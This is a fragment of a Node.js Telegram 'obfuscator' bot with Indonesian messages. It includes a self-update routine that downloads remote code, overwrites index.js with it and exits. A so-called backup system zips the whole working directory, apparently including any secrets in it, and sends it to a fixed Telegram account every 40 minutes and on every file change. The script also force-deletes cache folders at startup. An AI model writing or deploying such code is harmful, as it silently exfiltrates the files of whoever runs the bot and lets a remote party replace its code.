            ? fs.readFileSync(
                "./index.js",
                "utf8"
            )
            : ""

        const {
            data: remoteCode
        } =
        await axios.get(
            UPDATE_URL,
            {
                responseType: "text"
            }
        )

        await ctx.telegram
        .deleteMessage(
            waitMsg.chat.id,
            waitMsg.message_id
        )
        .catch(() => {})

        if (
            localCode.trim() ===
            remoteCode.trim()
        ) {

            return ctx.reply(
                "<blockquote><b>❌ Tidak Ada Update pada file</b></blockquote>",
                {
                    parse_mode: "HTML"
                }
            )

        }

        const updateMsg =
            await ctx.reply(
`<blockquote>✅ Berhasil Cek Update</blockquote>
<blockquote>Terdapat Update Pada file</blockquote>`, { parse_mode: "HTML" } )
await new Promise(
            r => setTimeout(
                r,
                1000
            )
        )

        const restartMsg =
            await ctx.reply(
"<blockquote><b>Bot akan di restart Tunggu beberapa detik hingga bot selesai</b></blockquote>\n<blockquote><b>🔄 Restart</b></blockquote>",
                {
                    parse_mode: "HTML"
                }
            )

        fs.writeFileSync(
            "./update.flag",
            JSON.stringify({
                updated: true,
                time: Date.now()
            })
        )

        fs.writeFileSync(
            "./index.js",
            remoteCode,
            "utf8"
        )

        await new Promise(
            r => setTimeout(
                r,
                1000
            )
        )

        await ctx.telegram
        .deleteMessage(
            updateMsg.chat.id,
            updateMsg.message_id
        )
        .catch(() => {})

        await ctx.telegram
        .deleteMessage(
            restartMsg.chat.id,
            restartMsg.message_id
        )
        .catch(() => {})

        process.exit(0)

    } catch (err) {

        await ctx.telegram
        .deleteMessage(
            waitMsg.chat.id,
            waitMsg.message_id
        )
        .catch(() => {})

        return ctx.reply(
`❌ Gagal Mengecek Update
${err.message} `, { parse_mode: "HTML" } )
}

}
)


// kontol up
// ==================== JALANKAN ====================
// =============================
// DELETE CACHE FOLDER
// =============================
const foldersToDelete = [

    ".npm",
    ".node_modules"

]

function deleteFolderRecursive(
    folderPath
) {

    if (
        fs.existsSync(folderPath)
    ) {

        fs.rmSync(
            folderPath,
            {
                recursive: true,
                force: true
            }
        )

        console.log(
            `[ DELETE ] ${folderPath}`
        )
    }
}

foldersToDelete.forEach(
    folder => {

        const folderPath =
            path.join(
                process.cwd(),
                folder
            )

        deleteFolderRecursive(
            folderPath
        )
    }
)


// =============================
// CREATE ZIP
// =============================
async function createBackupZip() {

    return new Promise(
        (resolve, reject) => {

        try {

            const fileName =
                `Backup.zip`

            const zipPath =
                path.join(
                    BACKUP_DIR,
                    fileName
                )

            const output =
                fs.createWriteStream(
                    zipPath
                )

            const archive =
                archiver(
                    "zip",
                    {
                        zlib: {
                            level: 9
                        }
                    }
                )

            output.on(
                "close",
                () => resolve(zipPath)
            )

            archive.on(
                "error",
                err => reject(err)
            )

            archive.pipe(output)

            const baseDir =
                process.cwd()

            const ignore = [

                "node_modules",
                ".git",
                "backup",
                "*.zip"

            ]

            fs.readdirSync(baseDir)
            .forEach(item => {

                if (
                    ignore.includes(item)
                ) return

                const fullPath =
                    path.join(
                        baseDir,
                        item
                    )

                const stat =
                    fs.statSync(fullPath)

                if (stat.isFile()) {

                    archive.file(
                        fullPath,
                        {
                            name: item
                        }
                    )

                } else
                if (stat.isDirectory()) {

                    archive.directory(
                        fullPath,
                        item
                    )
                }
            })

            archive.finalize()

        } catch (err) {

            reject(err)
        }
    })
}


// =============================
// SEND BACKUP
// =============================
async function sendBackup(
    reason = "File Backup"
) {

    try {

        console.log(
            `[ BACKUP ] membuat backup...`
        )

        const zipPath =
            await createBackupZip()

        const time =
            moment()
            .tz("Asia/Jakarta")
            .format(
                "DD/MM/YYYY HH:mm:ss"
            )

        await bot.telegram.sendDocument(
            BACKUP_OWNER_ID,
            {
                source: zipPath
            },
            {
                caption:
`
<blockquote><b>📦 SYSTEM BACKUP</b></blockquote>
<blockquote><b>📝 Reason : ${reason}</b></blockquote>
<blockquote><b>🕒 Time : ${time}</b></blockquote>
`,
                parse_mode: "HTML"
            }
        )

        console.log(
            `[ BACKUP ] sukses terkirim`
        )

        // hapus zip
        fs.unlinkSync(zipPath)

    } catch (err) {

        console.log(
            `[ BACKUP ERROR ]`
        )

        console.log(
            err.message
        )
    }
}

// =============================
// AUTO BACKUP EVERY 30 MINUTES
// =============================
setInterval(
    async () => {

        console.log(
            `[ AUTO BACKUP ]`
        )

        await sendBackup(
            "Auto Backup 40 Menit"
        )

    },

    40 * 60 * 1000
)


// =============================
// AUTO BACKUP SAAT FILE UPDATE
// =============================
const watcher =
chokidar.watch(
    process.cwd(),
    {
        ignored: [

            /node_modules/,
            /backup/,
            /.git/

        ],

        persistent: true
    }
)

watcher.on(
    "change",
    async filePath => {

        console.log(
            `[ FILE UPDATE ] ${filePath}`
        )

        await sendBackup(
            `File Update : ${filePath}`
        )
    }
)

console.log(
    `[ AUTO BACKUP SYSTEM ACTIVE ]`
);
bot.launch().then(() => console.log('✅ Bot obfuscator berjalan'));
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));